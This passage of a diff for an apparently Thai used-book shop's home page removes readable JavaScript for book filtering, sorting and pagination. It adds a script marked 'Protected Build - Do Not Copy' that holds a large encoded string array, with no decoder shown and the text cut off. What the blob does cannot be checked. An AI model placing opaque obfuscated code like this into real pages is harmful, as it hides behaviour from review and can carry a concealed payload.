-          const queueCount = book.activeQueueCount || 0;
-          const isReserved = book.stock_status === 'Reserved' || queueCount > 0;
-          if (isSoldOut || isReserved) return false;
-        }
-
-        // 4. ช่วงราคา
-        const price = Number(book.salePrice);
-        if (priceRange === 'under100' && price > 100) return false;
-        if (priceRange === '100to300' && (price < 100 || price > 300)) return false;
-        if (priceRange === 'over300' && price <= 300) return false;
-
-        // 5. สภาพหนังสือ
-        const cond = Number(book.conditionPercent || 90);
-        if (minCondition > 0 && cond < minCondition) return false;
-
-        // 6. คำค้นหา
-        if (query) {
-          const match =
-            (book.title || '').toLowerCase().includes(query) ||
-            (book.enTitle || '').toLowerCase().includes(query) ||
-            (book.author || '').toLowerCase().includes(query) ||
-            (book.categoryName || '').toLowerCase().includes(query) ||
-            (book.seller_name || '').toLowerCase().includes(query);
-          if (!match) return false;
-        }
-
-        return true;
-      });
-
-      // เรียงลำดับ (กรณีค่าเริ่มต้น 'latest' ใช้ระบบ Smart Blended Feed ดันร้านค้า VIP/แนะนำ สลับกับผู้ขายรายย่อยทั่วไปอย่างยุติธรรม)
-      if (sortBy === 'price-asc') {
-        filtered.sort((a, b) => Number(a.salePrice) - Number(b.salePrice));
-      } else if (sortBy === 'popular-queue') {
-        filtered.sort((a, b) => (Number(b.activeQueueCount || 0) - Number(a.activeQueueCount || 0)) || (Number(b.isBestSeller ? 1 : 0) - Number(a.isBestSeller ? 1 : 0)));
-      } else if (window.blendBooksFeed) {
-        filtered = window.blendBooksFeed(filtered);
-      }
-
-      if (headingEl) {
-        if (onlyWishlisted) {
-          headingEl.textContent = '🧡 หนังสือที่คุณเก็บไว้ดูภายหลัง (Wishlist)';
-        } else if (selectedCategory === 'all') {
-          headingEl.textContent = 'รายการหนังสือทั้งหมด';
-        } else {
-          const catObj = (window.CATEGORIES || []).find(c => c.id === selectedCategory);
-          headingEl.textContent = catObj ? `${catObj.icon} ${catObj.name}` : 'รายการหนังสือ';
-        }
-      }
-
-      if (summaryEl) {
-        const tags = [];
-        if (queueFilterMode === 'available') tags.push('เฉพาะคิวว่าง');
-        if (priceRange === 'under100') tags.push('ไม่เกิน 100฿');
-        if (priceRange === '100to300') tags.push('100฿ - 300฿');
-        if (priceRange === 'over300') tags.push('300฿ ขึ้นไป');
-        if (minCondition >= 90) tags.push('สภาพนางฟ้า 90%+');
-        else if (minCondition >= 80) tags.push('สภาพดี 80%+');
-        summaryEl.textContent = tags.length ? `• (${tags.join(', ')})` : '';
-      }
-
-      const visibleCount = Math.min(filtered.length, homeCurrentPage * HOME_PAGE_SIZE);
-      const paginatedBooks = filtered.slice(0, visibleCount);
-      const hasMore = visibleCount < filtered.length;
-
-      if (countEl) {
-        countEl.textContent = `แสดง ${paginatedBooks.length} จาก ${filtered.length} เล่ม`;
-      }
-
-      const loadMoreWrap = document.getElementById('home-load-more-wrap');
-      const paginationInfo = document.getElementById('home-pagination-info');
-      if (loadMoreWrap) {
-        if (hasMore) {
-          loadMoreWrap.classList.remove('hidden');
-          if (paginationInfo) {
-            paginationInfo.textContent = `กำลังแสดง ${paginatedBooks.length} จากทั้งหมด ${filtered.length} เล่ม (แบ่งโหลดครั้งละ ${HOME_PAGE_SIZE} เล่ม)`;
-          }
-        } else {
-          loadMoreWrap.classList.add('hidden');
-        }
-      }
-
-      if (!grid) return;
-
-      if (animate) {
-        grid.classList.remove('grid-fade-enter');
-        void grid.offsetWidth;
-        grid.classList.add('grid-fade-enter');
-      }
-
-      if (filtered.length === 0) {
-        grid.innerHTML = `
-          <div class="col-span-full bg-white rounded-3xl border border-[#E6E1D6] p-12 text-center space-y-3">
-            <div class="text-3xl">📖</div>
-            <h3 class="text-base font-bold text-[#1F4E4B]">ไม่พบหนังสือที่ตรงกับหมวดหมู่หรือตัวกรองนี้</h3>
-            <p class="text-xs text-[#5F7470]">ลองปรับตัวกรองช่วงราคา สภาพหนังสือ หรือกดดูหนังสือทั้งหมด</p>
-            <button onclick="resetAllHomeFilters()" class="px-5 py-2.5 rounded-full bg-[#26A69A] hover:bg-[#219187] text-white text-xs font-bold cursor-pointer">
-              แสดงหนังสือทั้งหมด
-            </button>
-          </div>
-        `;
-        return;
-      }
-
-      grid.innerHTML = paginatedBooks.map(book => createBookCardHTML(book)).join('');
-    }
-
-    function initHomePage() {
-      updateQueueFilterButtonsUI();
-      renderCategoryPills();
-      renderHomeBooksGrid(false);
-    }
-
-    document.addEventListener('DOMContentLoaded', initHomePage);
-    window.addEventListener('booksLoaded', initHomePage);
-    window.addEventListener('authUpdated', initHomePage);
-    window.addEventListener('wishlistUpdated', () => {
-      updateQueueFilterButtonsUI();
-      if (onlyWishlisted) renderHomeBooksGrid(false);
-    });
-  </script>
-</body>
-</html>
+        ><span>📖</span><span>โหลดหนังสือเพิ่มเติม (ครั้งละ 12 เล่ม)</span></button></div></section></main><div id="site-footer"></div><script src="js/books-data.js"></script><script src="js/app.js"></script><script>/* Protected Build - Do Not Copy */
+(function(){var _0x49c8dd=['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','gZMqYU56CEAsR0csR4EY98rATW4OJQ==','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